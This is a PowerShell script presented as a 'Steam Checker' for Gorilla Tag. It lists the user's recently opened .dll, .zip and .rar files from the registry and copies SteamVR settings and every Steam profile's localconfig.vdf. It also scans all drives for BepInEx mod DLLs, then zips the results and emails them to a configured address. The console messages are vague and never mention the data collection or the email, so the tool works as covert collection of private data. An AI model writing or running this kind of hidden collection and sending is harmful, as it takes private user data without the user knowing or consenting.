$OutDir  = Join-Path $env:USERPROFILE "AppData\Local\Steam_CheckerBootstrap"
$Report  = Join-Path $OutDir "bootstrap.log"
$LogEnc  = 'utf8'
$AppId   = '1533390'  

New-Item -ItemType Directory -Path $OutDir -Force | Out-Null

function Write-Step($msg) { Write-Host "- $msg" }
function Write-Report($text) {
  $enc = if ($LogEnc -ieq 'utf8') { [System.Text.UTF8Encoding]::new($false) } else { [System.Text.Encoding]::GetEncoding($LogEnc) }
  for ($i=0; $i -lt 12; $i++) {
    try {
      $fs = [System.IO.File]::Open($Report, [System.IO.FileMode]::OpenOrCreate, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite)
      $fs.Seek(0, [System.IO.SeekOrigin]::End) | Out-Null
      $sw = New-Object System.IO.StreamWriter($fs, $enc)
      $sw.WriteLine($text)
      $sw.Flush()
      $sw.Dispose()
      $fs.Dispose()
      break
    } catch {
      Start-Sleep -Milliseconds (100 * [Math]::Pow(2, [Math]::Min($i,6)))
      if ($i -eq 11) { Write-Host "log write failed: $($_.Exception.Message)" }
    }
  }
}

Write-Report ("Steam Checks - {0}`r`n" -f (Get-Date))
Write-Report "Output folder: $OutDir`r`n"

function Get-SteamRoot {
  try {
    $p = (Get-ItemProperty -Path 'HKCU:\Software\Valve\Steam' -ErrorAction Stop).SteamPath
    if ($p -and (Test-Path $p)) { return $p }
  } catch {}
  try {
    $p = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\WOW6432Node\Valve\Steam' -ErrorAction Stop).InstallPath
    if ($p -and (Test-Path $p)) { return $p }
  } catch {}
  return $null
}

function Get-ActiveSteamUser {
  $activeUser = $null
  $autoLoginUser = $null
  try { $activeUser = (Get-ItemProperty -Path 'HKCU:\Software\Valve\Steam' -Name 'ActiveUser' -ErrorAction SilentlyContinue).ActiveUser } catch {}
  try { $autoLoginUser = (Get-ItemProperty -Path 'HKCU:\Software\Valve\Steam' -Name 'AutoLoginUser' -ErrorAction SilentlyContinue).AutoLoginUser } catch {}
  if ($activeUser) { return "$activeUser" }
  if ($autoLoginUser) { return "$autoLoginUser" }
  return $null
}

function Get-LaunchOptionsFromVdf {
  param(
    [Parameter(Mandatory=$true)][string]$FilePath,
    [Parameter(Mandatory=$true)][string]$SearchAppId
  )
  if (-not (Test-Path -LiteralPath $FilePath)) { return $null }
  try { $text = Get-Content -Raw -LiteralPath $FilePath -ErrorAction Stop } catch { return $null }
  if (-not $text) { return $null }

  $pattern = [regex]::Escape('"' + $SearchAppId + '"') + '\s*\{(.*?)\}'
  $m = [regex]::Matches($text, $pattern, 'Singleline')
  foreach ($match in $m) {
    $inner = $match.Groups[1].Value
    $lo = [regex]::Match($inner, '"LaunchOptions"\s*"([^"]*)"')
    if ($lo.Success) { return $lo.Groups[1].Value }
    $lo2 = [regex]::Match($inner, '"Launch.*Options?"\s*"([^"]*)"')
    if ($lo2.Success) { return $lo2.Groups[1].Value }
  }
  return $null
}

function Get-LaunchOptionsFromRegistry {
  param([Parameter(Mandatory=$true)][string]$SearchAppId)
  $key = "HKCU:\Software\Valve\Steam\Apps\$SearchAppId"
  if (-not (Test-Path $key)) { return $null }
  try {
    $val = (Get-ItemProperty -Path $key -Name 'LaunchOptions' -ErrorAction SilentlyContinue).LaunchOptions
    if ($val) { return "$val" }
  } catch {}
  return $null
}

Write-Step "Reviewing Documents..."
Write-Report "RecentDocs (.dll/.zip/.rar)"

$recentBase = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs'
$targets = '.dll','.zip','.rar'
$encRecent = [System.Text.Encoding]::GetEncoding(0)

foreach ($ext in $targets) {
  $keyPath = Join-Path $recentBase $ext
  if (Test-Path $keyPath) {
    Write-Report "`r`n[$ext]"
    $values = (Get-Item $keyPath).GetValueNames() | Where-Object { $_ -ne 'MRUListEx' }
    foreach ($name in $values) {
      $raw = (Get-ItemProperty -Path $keyPath -Name $name).$name
      if ($raw -is [byte[]]) {
        $decoded = $encRecent.GetString($raw) -replace "`0",""
        if ($decoded) { Write-Report " - $decoded" }
      }
    }
  } else {
    Write-Report "`r`n[$ext] (no key)"
  }
}
Write-Step "Documents review complete."

Write-Step "Copying files..."
Write-Report "`r`nSteamVR settings"

function Copy-SteamVRConfig {  
  param([string]$steamRoot)
  $cand = @(
    (Join-Path $steamRoot 'config\steamvr.vrsettings'),
    (Join-Path $steamRoot 'steamapps\common\SteamVR\resources\settings\steamvr.vrsettings'),
    (Join-Path $steamRoot 'steamapps\common\SteamVR\drivers\null\resources\settings\default.vrsettings')
  )
  foreach ($p in $cand) {
    if (Test-Path $p) {
      $dest = Join-Path $OutDir ([IO.Path]::GetFileName($p))
      Copy-Item $p $dest -Force
      Write-Report "Copied: $p -> $dest"
      return $true
    }
  }
  return $false
}

$steamPath = $null
try { $steamPath = (Get-ItemProperty -Path 'HKCU:\Software\Valve\Steam' -ErrorAction Stop).SteamPath } catch {}

$copied = $false
if ($steamPath) { $copied = Copy-SteamVRConfig -steamRoot $steamPath }
if (-not $copied) {
  $commonGuesses = @("$env:ProgramFiles(x86)\Steam","$env:ProgramFiles\Steam","$env:ProgramData\Steam")
  foreach ($g in $commonGuesses) {
    if (Test-Path $g -PathType Container) {
      if (Copy-SteamVRConfig -steamRoot $g) { $copied = $true; break }
    }
  }
}
if (-not $copied) { Write-Report "steamvr.vrsettings not found." }
Write-Step "Copy complete."

Write-Step "Checking profiles & args..."
Write-Report "`r`nSteam profiles and Gorilla Tag launch options"

$steamRoot = Get-SteamRoot
if (-not $steamRoot) {
  Write-Report "Steam root not found. Skipping profile enumeration."
} else {
  $userdataPath = Join-Path $steamRoot 'userdata'
  $globalConfig = Join-Path (Join-Path $steamRoot 'config') 'localconfig.vdf'
  $activeId = Get-ActiveSteamUser

  $activeLabel = if ($activeId) { $activeId } else { '(unknown)' }
  Write-Report ("Steam root: {0}" -f $steamRoot)
  Write-Report ("Active user (HKCU ActiveUser/AutoLoginUser): {0}" -f $activeLabel)

  $globalLO = Get-LaunchOptionsFromVdf -FilePath $globalConfig -SearchAppId $AppId
  if ($globalLO) {
    Write-Report ("Global config LaunchOptions [{0}]: {1}" -f $AppId, $globalLO)
    try { Copy-Item $globalConfig (Join-Path $OutDir 'global_localconfig.vdf') -Force } catch {}
  } else {
    Write-Report ("Global config LaunchOptions [{0}]: (none)" -f $AppId)
  }

  $regLO = Get-LaunchOptionsFromRegistry -SearchAppId $AppId
  $regLabel = if ($regLO) { $regLO } else { '(none)' }
  Write-Report ("Registry LaunchOptions [{0}]: {1}" -f $AppId, $regLabel)

  if (Test-Path $userdataPath) {
    $users = Get-ChildItem -Path $userdataPath -Directory -ErrorAction SilentlyContinue
    if (-not $users -or $users.Count -eq 0) {
      Write-Report "No userdata folders found."
    } else {
      foreach ($u in ($users | Sort-Object Name)) {
        $sid = $u.Name
        $userCfg = Join-Path $u.FullName 'config\localconfig.vdf'
        $lo = Get-LaunchOptionsFromVdf -FilePath $userCfg -SearchAppId $AppId

        $isActive = ($activeId -and ($sid -eq "$activeId"))
        $flag = if ($isActive) { 'ACTIVE' } else { '' }

        $cfgLabel = if (Test-Path $userCfg) { $userCfg } else { '(missing)' }
        $loLabel  = if ($lo) { $lo } else { '(none)' }

        Write-Report ("`r`n[User {0}] {1}" -f $sid, $flag)
        Write-Report (" localconfig: {0}" -f $cfgLabel)
        Write-Report (" LaunchOptions [{0}]: {1}" -f $AppId, $loLabel)

        if (Test-Path $userCfg) {
          $destName = "localconfig_$($sid).vdf"
          try { Copy-Item $userCfg (Join-Path $OutDir $destName) -Force } catch {}
        }
      }
    }
  } else {
    Write-Report "Steam userdata path missing."
  }
}

Write-Step "Scanning drives... (This may take awhile)"
Write-Report "`r`nBepInEx plugins"

$drives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Free -ne $null }
$suspectRoots = @()
foreach ($d in $drives) {
  try {
    $found = Get-ChildItem -Path ($d.Root) -Directory -Recurse -ErrorAction SilentlyContinue |
      Where-Object { $_.FullName -match 'Gorilla Tag\\BepInEx\\plugins$' }
    if ($found) { $suspectRoots += $found }
  } catch {}
}

if ($suspectRoots.Count -eq 0) {
  Write-Report "No plugins folders found."
} else {
  foreach ($root in $suspectRoots) {
    Write-Report "`r`n[Plugins folder] $($root.FullName)"
    $dlls = Get-ChildItem -Path $root.FullName -Filter *.dll -File -ErrorAction SilentlyContinue
    if ($dlls.Count -eq 0) {
      Write-Report " (empty)"
    } else {
      foreach ($f in $dlls) {
        try {
          $hash = (Get-FileHash -Algorithm SHA256 -Path $f.FullName).Hash
          $line = ("{0} | {1} bytes | {2} | SHA256 {3}" -f $f.Name, ($f.Length), ($f.LastWriteTime.ToString("yyyy-MM-dd HH:mm")), $hash)
          Write-Report " - $line"
        } catch {
          Write-Report " - $($f.Name) | hash error: $($_.Exception.Message)"
        }
      }
    }
  }
}
Write-Step "Drive scan complete."

Write-Report "`r`nCompleted at $(Get-Date)"
Write-Step "Finalizing..."

$ZipPath = Join-Path $OutDir "bundle.zip"
if (Test-Path $ZipPath) { Remove-Item $ZipPath -Force -ErrorAction SilentlyContinue }
Compress-Archive -Path (Join-Path $OutDir '*') -DestinationPath $ZipPath -Force -ErrorAction SilentlyContinue
Write-Step "Packaging complete."

$cfgCandidates = @(
  (Join-Path $PSScriptRoot 'smtp_config.json'),
  (Join-Path $OutDir 'smtp_config.json')
)
$cfgPath = $cfgCandidates | Where-Object { Test-Path $_ } | Select-Object -First 1

if (-not $cfgPath) {
  Write-Step "Config missing."
} else {
  try {
    $cfg = Get-Content -Path $cfgPath -Raw | ConvertFrom-Json
    $client = New-Object System.Net.Mail.SmtpClient($cfg.SmtpHost, [int]$cfg.SmtpPort)
    $client.EnableSsl = [bool]$cfg.UseSsl
    $client.Credentials = New-Object System.Net.NetworkCredential($cfg.Username, $cfg.AppPassword)
    $mail = New-Object System.Net.Mail.MailMessage($cfg.From, $cfg.To)
    $mail.Subject = ("{0} Steam Checker {1}" -f $cfg.SubjectPrefix, (Get-Date -Format 'yyyy-MM-dd HH:mm'))
    $mail.Body = "Attached: report and bundle."
    if (Test-Path $Report) { $mail.Attachments.Add($Report) | Out-Null }
    if (Test-Path $ZipPath) { $mail.Attachments.Add($ZipPath) | Out-Null }
    $client.Send($mail)
    $mail.Dispose()
    Write-Step "Completed finalization."
  } catch {
    Write-Step "Email failed."
  }
}

Write-Step "Checks finished successfully."